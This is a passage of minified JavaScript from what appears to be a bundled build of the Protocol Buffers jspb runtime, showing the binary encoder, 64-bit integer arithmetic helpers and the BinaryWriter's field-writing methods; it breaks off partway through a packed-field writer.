                var be = /^get([A-Z]\w*)/.exec(at);
                if (be && at != "getExtension" && at != "getJsPbMessageId") {
                    var ze = "has" + be[1];
                    (!y[ze] || y[ze]()) && (ze = y[at](),
                    oe[Ht.$a(be[1])] = Ht.X(ze))
                }
            }
            if (y.extensionObject_)
                return oe.$extensions = "Recursive dumping of extensions not supported in compiled code. Switch to uncompiled or dump extension object directly",
                oe;
            for (G in m.extensions)
                if (/^\d+$/.test(G)) {
                    ze = m.extensions[G];
                    var at = y.getExtension(ze);
                    be = void 0,
                    ze = ze.Ba;
                    var $r = []
                      , ea = 0;
                    for (be in ze)
                        $r[ea++] = be;
                    be = $r[0],
                    at != null && (S || (S = oe.$extensions = {}),
                    S[Ht.$a(be)] = Ht.X(at))
                }
            return oe
        }
        ,
        Ht.$a = function(y) {
            return y.replace(/^[A-Z]/, function(m) {
                return m.toLowerCase()
            })
        }
        ;
        function De() {
            this.a = []
        }
        b("jspb.BinaryEncoder", De, void 0),
        De.prototype.length = function() {
            return this.a.length
        }
        ,
        De.prototype.length = De.prototype.length,
        De.prototype.end = function() {
            var y = this.a;
            return this.a = [],
            y
        }
        ,
        De.prototype.end = De.prototype.end,
        De.prototype.l = function(y, m) {
            for (M(y == Math.floor(y)),
            M(m == Math.floor(m)),
            M(0 <= y && 4294967296 > y),
            M(0 <= m && 4294967296 > m); 0 < m || 127 < y; )
                this.a.push(y & 127 | 128),
                y = (y >>> 7 | m << 25) >>> 0,
                m >>>= 7;
            this.a.push(y)
        }
        ,
        De.prototype.writeSplitVarint64 = De.prototype.l,
        De.prototype.A = function(y, m) {
            M(y == Math.floor(y)),
            M(m == Math.floor(m)),
            M(0 <= y && 4294967296 > y),
            M(0 <= m && 4294967296 > m),
            this.s(y),
            this.s(m)
        }
        ,
        De.prototype.writeSplitFixed64 = De.prototype.A,
        De.prototype.j = function(y) {
            for (M(y == Math.floor(y)),
            M(0 <= y && 4294967296 > y); 127 < y; )
                this.a.push(y & 127 | 128),
                y >>>= 7;
            this.a.push(y)
        }
        ,
        De.prototype.writeUnsignedVarint32 = De.prototype.j,
        De.prototype.M = function(y) {
            if (M(y == Math.floor(y)),
            M(-2147483648 <= y && 2147483648 > y),
            0 <= y)
                this.j(y);
            else {
                for (var m = 0; 9 > m; m++)
                    this.a.push(y & 127 | 128),
                    y >>= 7;
                this.a.push(1)
            }
        }
        ,
        De.prototype.writeSignedVarint32 = De.prototype.M,
        De.prototype.va = function(y) {
            M(y == Math.floor(y)),
            M(0 <= y && 18446744073709552e3 > y),
            rt(y),
            this.l(_e, Fe)
        }
        ,
        De.prototype.writeUnsignedVarint64 = De.prototype.va,
        De.prototype.ua = function(y) {
            M(y == Math.floor(y)),
            M(-9223372036854776e3 <= y && 9223372036854776e3 > y),
            rt(y),
            this.l(_e, Fe)
        }
        ,
        De.prototype.writeSignedVarint64 = De.prototype.ua,
        De.prototype.wa = function(y) {
            M(y == Math.floor(y)),
            M(-2147483648 <= y && 2147483648 > y),
            this.j((y << 1 ^ y >> 31) >>> 0)
        }
        ,
        De.prototype.writeZigzagVarint32 = De.prototype.wa,
        De.prototype.xa = function(y) {
            M(y == Math.floor(y)),
            M(-9223372036854776e3 <= y && 9223372036854776e3 > y),
            xt(y),
            this.l(_e, Fe)
        }
        ,
        De.prototype.writeZigzagVarint64 = De.prototype.xa,
        De.prototype.Ta = function(y) {
            this.W(vt(y))
        }
        ,
        De.prototype.writeZigzagVarint64String = De.prototype.Ta,
        De.prototype.W = function(y) {
            var m = this;
            Ye(y),
            Cr(_e, Fe, function(S, G) {
                m.l(S >>> 0, G >>> 0)
            })
        }
        ,
        De.prototype.writeZigzagVarintHash64 = De.prototype.W,
        De.prototype.be = function(y) {
            M(y == Math.floor(y)),
            M(0 <= y && 256 > y),
            this.a.push(y >>> 0 & 255)
        }
        ,
        De.prototype.writeUint8 = De.prototype.be,
        De.prototype.ae = function(y) {
            M(y == Math.floor(y)),
            M(0 <= y && 65536 > y),
            this.a.push(y >>> 0 & 255),
            this.a.push(y >>> 8 & 255)
        }
        ,
        De.prototype.writeUint16 = De.prototype.ae,
        De.prototype.s = function(y) {
            M(y == Math.floor(y)),
            M(0 <= y && 4294967296 > y),
            this.a.push(y >>> 0 & 255),
            this.a.push(y >>> 8 & 255),
            this.a.push(y >>> 16 & 255),
            this.a.push(y >>> 24 & 255)
        }
        ,
        De.prototype.writeUint32 = De.prototype.s,
        De.prototype.V = function(y) {
            M(y == Math.floor(y)),
            M(0 <= y && 18446744073709552e3 > y),
            Je(y),
            this.s(_e),
            this.s(Fe)
        }
        ,
        De.prototype.writeUint64 = De.prototype.V,
        De.prototype.Qc = function(y) {
            M(y == Math.floor(y)),
            M(-128 <= y && 128 > y),
            this.a.push(y >>> 0 & 255)
        }
        ,
        De.prototype.writeInt8 = De.prototype.Qc,
        De.prototype.Pc = function(y) {
            M(y == Math.floor(y)),
            M(-32768 <= y && 32768 > y),
            this.a.push(y >>> 0 & 255),
            this.a.push(y >>> 8 & 255)
        }
        ,
        De.prototype.writeInt16 = De.prototype.Pc,
        De.prototype.S = function(y) {
            M(y == Math.floor(y)),
            M(-2147483648 <= y && 2147483648 > y),
            this.a.push(y >>> 0 & 255),
            this.a.push(y >>> 8 & 255),
            this.a.push(y >>> 16 & 255),
            this.a.push(y >>> 24 & 255)
        }
        ,
        De.prototype.writeInt32 = De.prototype.S,
        De.prototype.T = function(y) {
            M(y == Math.floor(y)),
            M(-9223372036854776e3 <= y && 9223372036854776e3 > y),
            rt(y),
            this.A(_e, Fe)
        }
        ,
        De.prototype.writeInt64 = De.prototype.T,
        De.prototype.ka = function(y) {
            M(y == Math.floor(y)),
            M(-9223372036854776e3 <= +y && 9223372036854776e3 > +y),
            Ye(vt(y)),
            this.A(_e, Fe)
        }
        ,
        De.prototype.writeInt64String = De.prototype.ka,
        De.prototype.L = function(y) {
            M(y === 1 / 0 || y === -1 / 0 || isNaN(y) || -34028234663852886e22 <= y && 34028234663852886e22 >= y),
            Tt(y),
            this.s(_e)
        }
        ,
        De.prototype.writeFloat = De.prototype.L,
        De.prototype.J = function(y) {
            M(y === 1 / 0 || y === -1 / 0 || isNaN(y) || -17976931348623157e292 <= y && 17976931348623157e292 >= y),
            Qe(y),
            this.s(_e),
            this.s(Fe)
        }
        ,
        De.prototype.writeDouble = De.prototype.J,
        De.prototype.I = function(y) {
            M(typeof y == "boolean" || typeof y == "number"),
            this.a.push(y ? 1 : 0)
        }
        ,
        De.prototype.writeBool = De.prototype.I,
        De.prototype.R = function(y) {
            M(y == Math.floor(y)),
            M(-2147483648 <= y && 2147483648 > y),
            this.M(y)
        }
        ,
        De.prototype.writeEnum = De.prototype.R,
        De.prototype.ja = function(y) {
            this.a.push.apply(this.a, y)
        }
        ,
        De.prototype.writeBytes = De.prototype.ja,
        De.prototype.N = function(y) {
            Ye(y),
            this.l(_e, Fe)
        }
        ,
        De.prototype.writeVarintHash64 = De.prototype.N,
        De.prototype.K = function(y) {
            Ye(y),
            this.s(_e),
            this.s(Fe)
        }
        ,
        De.prototype.writeFixedHash64 = De.prototype.K,
        De.prototype.U = function(y) {
            var m = this.a.length;
            C(y);
            for (var S = 0; S < y.length; S++) {
                var G = y.charCodeAt(S);
                if (128 > G)
                    this.a.push(G);
                else if (2048 > G)
                    this.a.push(G >> 6 | 192),
                    this.a.push(G & 63 | 128);
                else if (65536 > G)
                    if (55296 <= G && 56319 >= G && S + 1 < y.length) {
                        var oe = y.charCodeAt(S + 1);
                        56320 <= oe && 57343 >= oe && (G = 1024 * (G - 55296) + oe - 56320 + 65536,
                        this.a.push(G >> 18 | 240),
                        this.a.push(G >> 12 & 63 | 128),
                        this.a.push(G >> 6 & 63 | 128),
                        this.a.push(G & 63 | 128),
                        S++)
                    } else
                        this.a.push(G >> 12 | 224),
                        this.a.push(G >> 6 & 63 | 128),
                        this.a.push(G & 63 | 128)
            }
            return this.a.length - m
        }
        ,
        De.prototype.writeString = De.prototype.U;
        function Ge(y, m) {
            this.lo = y,
            this.hi = m
        }
        b("jspb.arith.UInt64", Ge, void 0),
        Ge.prototype.cmp = function(y) {
            return this.hi < y.hi || this.hi == y.hi && this.lo < y.lo ? -1 : this.hi == y.hi && this.lo == y.lo ? 0 : 1
        }
        ,
        Ge.prototype.cmp = Ge.prototype.cmp,
        Ge.prototype.La = function() {
            return new Ge((this.lo >>> 1 | (this.hi & 1) << 31) >>> 0,this.hi >>> 1 >>> 0)
        }
        ,
        Ge.prototype.rightShift = Ge.prototype.La,
        Ge.prototype.Da = function() {
            return new Ge(this.lo << 1 >>> 0,(this.hi << 1 | this.lo >>> 31) >>> 0)
        }
        ,
        Ge.prototype.leftShift = Ge.prototype.Da,
        Ge.prototype.cb = function() {
            return !!(this.hi & 2147483648)
        }
        ,
        Ge.prototype.msb = Ge.prototype.cb,
        Ge.prototype.Ob = function() {
            return !!(this.lo & 1)
        }
        ,
        Ge.prototype.lsb = Ge.prototype.Ob,
        Ge.prototype.Ua = function() {
            return this.lo == 0 && this.hi == 0
        }
        ,
        Ge.prototype.zero = Ge.prototype.Ua,
        Ge.prototype.add = function(y) {
            return new Ge((this.lo + y.lo & 4294967295) >>> 0 >>> 0,((this.hi + y.hi & 4294967295) >>> 0) + (4294967296 <= this.lo + y.lo ? 1 : 0) >>> 0)
        }
        ,
        Ge.prototype.add = Ge.prototype.add,
        Ge.prototype.sub = function(y) {
            return new Ge((this.lo - y.lo & 4294967295) >>> 0 >>> 0,((this.hi - y.hi & 4294967295) >>> 0) - (0 > this.lo - y.lo ? 1 : 0) >>> 0)
        }
        ,
        Ge.prototype.sub = Ge.prototype.sub;
        function kt(y, m) {
            var S = y & 65535;
            y >>>= 16;
            var G = m & 65535
              , oe = m >>> 16;
            for (m = S * G + 65536 * (S * oe & 65535) + 65536 * (y * G & 65535),
            S = y * oe + (S * oe >>> 16) + (y * G >>> 16); 4294967296 <= m; )
                m -= 4294967296,
                S += 1;
            return new Ge(m >>> 0,S >>> 0)
        }
        Ge.mul32x32 = kt,
        Ge.prototype.eb = function(y) {
            var m = kt(this.lo, y);
            return y = kt(this.hi, y),
            y.hi = y.lo,
            y.lo = 0,
            m.add(y)
        }
        ,
        Ge.prototype.mul = Ge.prototype.eb,
        Ge.prototype.Xa = function(y) {
            if (y == 0)
                return [];
            var m = new Ge(0,0)
              , S = new Ge(this.lo,this.hi);
            y = new Ge(y,0);
            for (var G = new Ge(1,0); !y.cb(); )
                y = y.Da(),
                G = G.Da();
            for (; !G.Ua(); )
                0 >= y.cmp(S) && (m = m.add(G),
                S = S.sub(y)),
                y = y.La(),
                G = G.La();
            return [m, S]
        }
        ,
        Ge.prototype.div = Ge.prototype.Xa,
        Ge.prototype.toString = function() {
            for (var y = "", m = this; !m.Ua(); ) {
                m = m.Xa(10);
                var S = m[0];
                y = m[1].lo + y,
                m = S
            }
            return y == "" && (y = "0"),
            y
        }
        ,
        Ge.prototype.toString = Ge.prototype.toString;
        function mn(y) {
            for (var m = new Ge(0,0), S = new Ge(0,0), G = 0; G < y.length; G++) {
                if ("0" > y[G] || "9" < y[G])
                    return null;
                S.lo = parseInt(y[G], 10),
                m = m.eb(10).add(S)
            }
            return m
        }
        Ge.fromString = mn,
        Ge.prototype.clone = function() {
            return new Ge(this.lo,this.hi)
        }
        ,
        Ge.prototype.clone = Ge.prototype.clone;
        function Lt(y, m) {
            this.lo = y,
            this.hi = m
        }
        b("jspb.arith.Int64", Lt, void 0),
        Lt.prototype.add = function(y) {
            return new Lt((this.lo + y.lo & 4294967295) >>> 0 >>> 0,((this.hi + y.hi & 4294967295) >>> 0) + (4294967296 <= this.lo + y.lo ? 1 : 0) >>> 0)
        }
        ,
        Lt.prototype.add = Lt.prototype.add,
        Lt.prototype.sub = function(y) {
            return new Lt((this.lo - y.lo & 4294967295) >>> 0 >>> 0,((this.hi - y.hi & 4294967295) >>> 0) - (0 > this.lo - y.lo ? 1 : 0) >>> 0)
        }
        ,
        Lt.prototype.sub = Lt.prototype.sub,
        Lt.prototype.clone = function() {
            return new Lt(this.lo,this.hi)
        }
        ,
        Lt.prototype.clone = Lt.prototype.clone,
        Lt.prototype.toString = function() {
            var y = (this.hi & 2147483648) != 0
              , m = new Ge(this.lo,this.hi);
            return y && (m = new Ge(0,0).sub(m)),
            (y ? "-" : "") + m.toString()
        }
        ,
        Lt.prototype.toString = Lt.prototype.toString;
        function Le(y) {
            var m = 0 < y.length && y[0] == "-";
            return m && (y = y.substring(1)),
            y = mn(y),
            y === null ? null : (m && (y = new Ge(0,0).sub(y)),
            new Lt(y.lo,y.hi))
        }
        Lt.fromString = Le;
        function te() {
            this.c = [],
            this.b = 0,
            this.a = new De,
            this.h = []
        }
        b("jspb.BinaryWriter", te, void 0);
        function qo(y, m) {
            var S = y.a.end();
            y.c.push(S),
            y.c.push(m),
            y.b += S.length + m.length
        }
        function Pt(y, m) {
            return it(y, m, 2),
            m = y.a.end(),
            y.c.push(m),
            y.b += m.length,
            m.push(y.b),
            m
        }
        function Gt(y, m) {
            var S = m.pop();
            for (S = y.b + y.a.length() - S,
            M(0 <= S); 127 < S; )
                m.push(S & 127 | 128),
                S >>>= 7,
                y.b++;
            m.push(S),
            y.b++
        }
        te.prototype.pb = function(y, m, S) {
            qo(this, y.subarray(m, S))
        }
        ,
        te.prototype.writeSerializedMessage = te.prototype.pb,
        te.prototype.Pb = function(y, m, S) {
            y != null && m != null && S != null && this.pb(y, m, S)
        }
        ,
        te.prototype.maybeWriteSerializedMessage = te.prototype.Pb,
        te.prototype.reset = function() {
            this.c = [],
            this.a.end(),
            this.b = 0,
            this.h = []
        }
        ,
        te.prototype.reset = te.prototype.reset,
        te.prototype.ab = function() {
            M(this.h.length == 0);
            for (var y = new Uint8Array(this.b + this.a.length()), m = this.c, S = m.length, G = 0, oe = 0; oe < S; oe++) {
                var be = m[oe];
                y.set(be, G),
                G += be.length
            }
            return m = this.a.end(),
            y.set(m, G),
            G += m.length,
            M(G == y.length),
            this.c = [y],
            y
        }
        ,
        te.prototype.getResultBuffer = te.prototype.ab,
        te.prototype.Kb = function(y) {
            return ae(this.ab(), y)
        }
        ,
        te.prototype.getResultBase64String = te.prototype.Kb,
        te.prototype.Va = function(y) {
            this.h.push(Pt(this, y))
        }
        ,
        te.prototype.beginSubMessage = te.prototype.Va,
        te.prototype.Ya = function() {
            M(0 <= this.h.length),
            Gt(this, this.h.pop())
        }
        ,
        te.prototype.endSubMessage = te.prototype.Ya;
        function it(y, m, S) {
            M(1 <= m && m == Math.floor(m)),
            y.a.j(8 * m + S)
        }
        te.prototype.Nc = function(y, m, S) {
            switch (y) {
            case 1:
                this.J(m, S);
                break;
            case 2:
                this.L(m, S);
                break;
            case 3:
                this.T(m, S);
                break;
            case 4:
                this.V(m, S);
                break;
            case 5:
                this.S(m, S);
                break;
            case 6:
                this.Qa(m, S);
                break;
            case 7:
                this.Pa(m, S);
                break;
            case 8:
                this.I(m, S);
                break;
            case 9:
                this.U(m, S);
                break;
            case 10:
                k("Group field type not supported in writeAny()");
                break;
            case 11:
                k("Message field type not supported in writeAny()");
                break;
            case 12:
                this.ja(m, S);
                break;
            case 13:
                this.s(m, S);
                break;
            case 14:
                this.R(m, S);
                break;
            case 15:
                this.Ra(m, S);
                break;
            case 16:
                this.Sa(m, S);
                break;
            case 17:
                this.rb(m, S);
                break;
            case 18:
                this.sb(m, S);
                break;
            case 30:
                this.K(m, S);
                break;
            case 31:
                this.N(m, S);
                break;
            default:
                k("Invalid field type in writeAny()")
            }
        }
        ,
        te.prototype.writeAny = te.prototype.Nc;
        function sn(y, m, S) {
            S != null && (it(y, m, 0),
            y.a.j(S))
        }
        function Wt(y, m, S) {
            S != null && (it(y, m, 0),
            y.a.M(S))
        }
        te.prototype.S = function(y, m) {
            m != null && (M(-2147483648 <= m && 2147483648 > m),
            Wt(this, y, m))
        }
        ,
        te.prototype.writeInt32 = te.prototype.S,
        te.prototype.ob = function(y, m) {
            m != null && (m = parseInt(m, 10),
            M(-2147483648 <= m && 2147483648 > m),
            Wt(this, y, m))
        }
        ,
        te.prototype.writeInt32String = te.prototype.ob,
        te.prototype.T = function(y, m) {
            m != null && (M(-9223372036854776e3 <= m && 9223372036854776e3 > m),
            m != null && (it(this, y, 0),
            this.a.ua(m)))
        }
        ,
        te.prototype.writeInt64 = te.prototype.T,
        te.prototype.ka = function(y, m) {
            m != null && (m = Le(m),
            it(this, y, 0),
            this.a.l(m.lo, m.hi))
        }
        ,
        te.prototype.writeInt64String = te.prototype.ka,
        te.prototype.s = function(y, m) {
            m != null && (M(0 <= m && 4294967296 > m),
            sn(this, y, m))
        }
        ,
        te.prototype.writeUint32 = te.prototype.s,
        te.prototype.ub = function(y, m) {
            m != null && (m = parseInt(m, 10),
            M(0 <= m && 4294967296 > m),
            sn(this, y, m))
        }
        ,
        te.prototype.writeUint32String = te.prototype.ub,
        te.prototype.V = function(y, m) {
            m != null && (M(0 <= m && 18446744073709552e3 > m),
            m != null && (it(this, y, 0),
            this.a.va(m)))
        }
        ,
        te.prototype.writeUint64 = te.prototype.V,
        te.prototype.vb = function(y, m) {
            m != null && (m = mn(m),
            it(this, y, 0),
            this.a.l(m.lo, m.hi))
        }
        ,
        te.prototype.writeUint64String = te.prototype.vb,
        te.prototype.rb = function(y, m) {
            m != null && (M(-2147483648 <= m && 2147483648 > m),
            m != null && (it(this, y, 0),
            this.a.wa(m)))
        }
        ,
        te.prototype.writeSint32 = te.prototype.rb,
        te.prototype.sb = function(y, m) {
            m != null && (M(-9223372036854776e3 <= m && 9223372036854776e3 > m),
            m != null && (it(this, y, 0),
            this.a.xa(m)))
        }
        ,
        te.prototype.writeSint64 = te.prototype.sb,
        te.prototype.$d = function(y, m) {
            m != null && m != null && (it(this, y, 0),
            this.a.W(m))
        }
        ,
        te.prototype.writeSintHash64 = te.prototype.$d,
        te.prototype.Zd = function(y, m) {
            m != null && m != null && (it(this, y, 0),
            this.a.Ta(m))
        }
        ,
        te.prototype.writeSint64String = te.prototype.Zd,
        te.prototype.Pa = function(y, m) {
            m != null && (M(0 <= m && 4294967296 > m),
            it(this, y, 5),
            this.a.s(m))
        }
        ,
        te.prototype.writeFixed32 = te.prototype.Pa,
        te.prototype.Qa = function(y, m) {
            m != null && (M(0 <= m && 18446744073709552e3 > m),
            it(this, y, 1),
            this.a.V(m))
        }
        ,
        te.prototype.writeFixed64 = te.prototype.Qa,
        te.prototype.nb = function(y, m) {
            m != null && (m = mn(m),
            it(this, y, 1),
            this.a.A(m.lo, m.hi))
        }
        ,
        te.prototype.writeFixed64String = te.prototype.nb,
        te.prototype.Ra = function(y, m) {
            m != null && (M(-2147483648 <= m && 2147483648 > m),
            it(this, y, 5),
            this.a.S(m))
        }
        ,
        te.prototype.writeSfixed32 = te.prototype.Ra,
        te.prototype.Sa = function(y, m) {
            m != null && (M(-9223372036854776e3 <= m && 9223372036854776e3 > m),
            it(this, y, 1),
            this.a.T(m))
        }
        ,
        te.prototype.writeSfixed64 = te.prototype.Sa,
        te.prototype.qb = function(y, m) {
            m != null && (m = Le(m),
            it(this, y, 1),
            this.a.A(m.lo, m.hi))
        }
        ,
        te.prototype.writeSfixed64String = te.prototype.qb,
        te.prototype.L = function(y, m) {
            m != null && (it(this, y, 5),
            this.a.L(m))
        }
        ,
        te.prototype.writeFloat = te.prototype.L,
        te.prototype.J = function(y, m) {
            m != null && (it(this, y, 1),
            this.a.J(m))
        }
        ,
        te.prototype.writeDouble = te.prototype.J,
        te.prototype.I = function(y, m) {
            m != null && (M(typeof m == "boolean" || typeof m == "number"),
            it(this, y, 0),
            this.a.I(m))
        }
        ,
        te.prototype.writeBool = te.prototype.I,
        te.prototype.R = function(y, m) {
            m != null && (M(-2147483648 <= m && 2147483648 > m),
            it(this, y, 0),
            this.a.M(m))
        }
        ,
        te.prototype.writeEnum = te.prototype.R,
        te.prototype.U = function(y, m) {
            m != null && (y = Pt(this, y),
            this.a.U(m),
            Gt(this, y))
        }
        ,
        te.prototype.writeString = te.prototype.U,
        te.prototype.ja = function(y, m) {
            m != null && (m = ne(m),
            it(this, y, 2),
            this.a.j(m.length),
            qo(this, m))
        }
        ,
        te.prototype.writeBytes = te.prototype.ja,
        te.prototype.Rc = function(y, m, S) {
            m != null && (y = Pt(this, y),
            S(m, this),
            Gt(this, y))
        }
        ,
        te.prototype.writeMessage = te.prototype.Rc,
        te.prototype.Sc = function(y, m, S) {
            m != null && (it(this, 1, 3),
            it(this, 2, 0),
            this.a.M(y),
            y = Pt(this, 3),
            S(m, this),
            Gt(this, y),
            it(this, 1, 4))
        }
        ,
        te.prototype.writeMessageSet = te.prototype.Sc,
        te.prototype.Oc = function(y, m, S) {
            m != null && (it(this, y, 3),
            S(m, this),
            it(this, y, 4))
        }
        ,
        te.prototype.writeGroup = te.prototype.Oc,
        te.prototype.K = function(y, m) {
            m != null && (M(m.length == 8),
            it(this, y, 1),
            this.a.K(m))
        }
        ,
        te.prototype.writeFixedHash64 = te.prototype.K,
        te.prototype.N = function(y, m) {
            m != null && (M(m.length == 8),
            it(this, y, 0),
            this.a.N(m))
        }
        ,
        te.prototype.writeVarintHash64 = te.prototype.N,
        te.prototype.A = function(y, m, S) {
            it(this, y, 1),
            this.a.A(m, S)
        }
        ,
        te.prototype.writeSplitFixed64 = te.prototype.A,
        te.prototype.l = function(y, m, S) {
            it(this, y, 0),
            this.a.l(m, S)
        }
        ,
        te.prototype.writeSplitVarint64 = te.prototype.l,
        te.prototype.tb = function(y, m, S) {
            it(this, y, 0);
            var G = this.a;
            Cr(m, S, function(oe, be) {
                G.l(oe >>> 0, be >>> 0)
            })
        }
        ,
        te.prototype.writeSplitZigzagVarint64 = te.prototype.tb,
        te.prototype.Ed = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    Wt(this, y, m[S])
        }
        ,
        te.prototype.writeRepeatedInt32 = te.prototype.Ed,
        te.prototype.Fd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.ob(y, m[S])
        }
        ,
        te.prototype.writeRepeatedInt32String = te.prototype.Fd,
        te.prototype.Gd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++) {
                    var G = m[S];
                    G != null && (it(this, y, 0),
                    this.a.ua(G))
                }
        }
        ,
        te.prototype.writeRepeatedInt64 = te.prototype.Gd,
        te.prototype.Qd = function(y, m, S, G) {
            if (m != null)
                for (var oe = 0; oe < m.length; oe++)
                    this.A(y, S(m[oe]), G(m[oe]))
        }
        ,
        te.prototype.writeRepeatedSplitFixed64 = te.prototype.Qd,
        te.prototype.Rd = function(y, m, S, G) {
            if (m != null)
                for (var oe = 0; oe < m.length; oe++)
                    this.l(y, S(m[oe]), G(m[oe]))
        }
        ,
        te.prototype.writeRepeatedSplitVarint64 = te.prototype.Rd,
        te.prototype.Sd = function(y, m, S, G) {
            if (m != null)
                for (var oe = 0; oe < m.length; oe++)
                    this.tb(y, S(m[oe]), G(m[oe]))
        }
        ,
        te.prototype.writeRepeatedSplitZigzagVarint64 = te.prototype.Sd,
        te.prototype.Hd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.ka(y, m[S])
        }
        ,
        te.prototype.writeRepeatedInt64String = te.prototype.Hd,
        te.prototype.Ud = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    sn(this, y, m[S])
        }
        ,
        te.prototype.writeRepeatedUint32 = te.prototype.Ud,
        te.prototype.Vd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.ub(y, m[S])
        }
        ,
        te.prototype.writeRepeatedUint32String = te.prototype.Vd,
        te.prototype.Wd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++) {
                    var G = m[S];
                    G != null && (it(this, y, 0),
                    this.a.va(G))
                }
        }
        ,
        te.prototype.writeRepeatedUint64 = te.prototype.Wd,
        te.prototype.Xd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.vb(y, m[S])
        }
        ,
        te.prototype.writeRepeatedUint64String = te.prototype.Xd,
        te.prototype.Md = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++) {
                    var G = m[S];
                    G != null && (it(this, y, 0),
                    this.a.wa(G))
                }
        }
        ,
        te.prototype.writeRepeatedSint32 = te.prototype.Md,
        te.prototype.Nd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++) {
                    var G = m[S];
                    G != null && (it(this, y, 0),
                    this.a.xa(G))
                }
        }
        ,
        te.prototype.writeRepeatedSint64 = te.prototype.Nd,
        te.prototype.Od = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++) {
                    var G = m[S];
                    G != null && (it(this, y, 0),
                    this.a.Ta(G))
                }
        }
        ,
        te.prototype.writeRepeatedSint64String = te.prototype.Od,
        te.prototype.Pd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++) {
                    var G = m[S];
                    G != null && (it(this, y, 0),
                    this.a.W(G))
                }
        }
        ,
        te.prototype.writeRepeatedSintHash64 = te.prototype.Pd,
        te.prototype.yd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.Pa(y, m[S])
        }
        ,
        te.prototype.writeRepeatedFixed32 = te.prototype.yd,
        te.prototype.zd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.Qa(y, m[S])
        }
        ,
        te.prototype.writeRepeatedFixed64 = te.prototype.zd,
        te.prototype.Ad = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.nb(y, m[S])
        }
        ,
        te.prototype.writeRepeatedFixed64String = te.prototype.Ad,
        te.prototype.Jd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.Ra(y, m[S])
        }
        ,
        te.prototype.writeRepeatedSfixed32 = te.prototype.Jd,
        te.prototype.Kd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.Sa(y, m[S])
        }
        ,
        te.prototype.writeRepeatedSfixed64 = te.prototype.Kd,
        te.prototype.Ld = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.qb(y, m[S])
        }
        ,
        te.prototype.writeRepeatedSfixed64String = te.prototype.Ld,
        te.prototype.Cd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.L(y, m[S])
        }
        ,
        te.prototype.writeRepeatedFloat = te.prototype.Cd,
        te.prototype.wd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.J(y, m[S])
        }
        ,
        te.prototype.writeRepeatedDouble = te.prototype.wd,
        te.prototype.ud = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.I(y, m[S])
        }
        ,
        te.prototype.writeRepeatedBool = te.prototype.ud,
        te.prototype.xd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.R(y, m[S])
        }
        ,
        te.prototype.writeRepeatedEnum = te.prototype.xd,
        te.prototype.Td = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.U(y, m[S])
        }
        ,
        te.prototype.writeRepeatedString = te.prototype.Td,
        te.prototype.vd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.ja(y, m[S])
        }
        ,
        te.prototype.writeRepeatedBytes = te.prototype.vd,
        te.prototype.Id = function(y, m, S) {
            if (m != null)
                for (var G = 0; G < m.length; G++) {
                    var oe = Pt(this, y);
                    S(m[G], this),
                    Gt(this, oe)
                }
        }
        ,
        te.prototype.writeRepeatedMessage = te.prototype.Id,
        te.prototype.Dd = function(y, m, S) {
            if (m != null)
                for (var G = 0; G < m.length; G++)
                    it(this, y, 3),
                    S(m[G], this),
                    it(this, y, 4)
        }
        ,
        te.prototype.writeRepeatedGroup = te.prototype.Dd,
        te.prototype.Bd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.K(y, m[S])
        }
        ,
        te.prototype.writeRepeatedFixedHash64 = te.prototype.Bd,
        te.prototype.Yd = function(y, m) {
            if (m != null)
                for (var S = 0; S < m.length; S++)
                    this.N(y, m[S])
        }
        ,
        te.prototype.writeRepeatedVarintHash64 = te.prototype.Yd,
        te.prototype.ad = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.M(m[S]);
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedInt32 = te.prototype.ad,
        te.prototype.bd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.M(parseInt(m[S], 10));
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedInt32String = te.prototype.bd,
        te.prototype.cd = function(y, m) {
            if (m != null && m.length) {
                y = Pt(this, y);
                for (var S = 0; S < m.length; S++)
                    this.a.ua(m[S]);
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedInt64 = te.prototype.cd,
        te.prototype.md = function(y, m, S, G) {
            if (m != null) {
                y = Pt(this, y);
                for (var oe = 0; oe < m.length; oe++)
                    this.a.A(S(m[oe]), G(m[oe]));
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedSplitFixed64 = te.prototype.md,
        te.prototype.nd = function(y, m, S, G) {
            if (m != null) {
                y = Pt(this, y);
                for (var oe = 0; oe < m.length; oe++)
                    this.a.l(S(m[oe]), G(m[oe]));
                Gt(this, y)
            }
        }
        ,
        te.prototype.writePackedSplitVarint64 = te.prototype.nd,
        te.prototype.od = function(y, m, S, G) {
            if (m != null) {
                y = Pt(this, y);
                for (var oe = this.a, be = 0; be < m.length; be++)
